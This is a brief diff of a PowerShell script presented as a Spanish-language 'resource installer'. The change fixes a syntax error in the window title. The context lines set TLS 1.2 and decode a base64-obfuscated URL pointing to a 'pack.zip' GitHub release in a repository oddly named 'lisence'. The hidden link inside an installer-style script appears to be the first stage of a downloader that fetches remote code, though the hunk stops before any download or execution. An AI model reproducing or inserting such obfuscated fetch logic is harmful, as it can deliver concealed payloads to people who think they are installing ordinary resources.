@@ -1,5 +1,5 @@
 ## Configuración  - Recursos
-$Host.UI.RawUI.WindowTitle = = " Instalador de Recursos"
+$Host.UI.RawUI.WindowTitle = " Instalador de Recursos"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 $e = "aHR0cHM6Ly9naXRodWIuY29tL1QtcmV4MjEvbGlzZW5jZS9yZWxlYXNlcy9kb3dubG9hZC92MS4wLjAvcGFjay56aXA="
 $link = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($e))
